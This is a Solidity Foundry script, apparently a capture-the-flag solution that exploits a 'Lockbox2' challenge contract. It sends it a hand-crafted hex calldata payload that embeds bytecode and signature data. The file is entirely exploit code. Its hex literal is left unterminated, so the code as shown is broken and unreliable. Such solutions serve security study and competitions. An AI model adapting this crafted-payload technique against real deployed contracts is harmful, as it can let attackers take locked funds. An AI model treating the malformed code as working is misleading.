// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./challenge/Setup.sol";
import "forge-std/console.sol";

function playerScript(address setupAddress) {
    new Lockbox2Exploit().exploit(setupAddress);
}

contract Lockbox2Exploit {
    event log_bytes(bytes);

    function exploit(address setupAddress) public {
        Lockbox2 lockbox2 = Setup(setupAddress).lockbox2();
        bytes memory data =
            hex"890d690800000000000000000000000000000000000000000000000000000000000000610000000000000000000000000000000000000000000000000000000000000101000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010060025A06600857005b5b5b3060408060153d393df300bf29416334998cdd54c22df0f61c3d055cf61f8e4f17d723d0269511cab6a085d8c6a011b626029d812128b3638c02f3aac2a3c62a2341bb87cce6fd
        (bool _success,) = address(lockbox2).call(data);
        _success;
    }
}
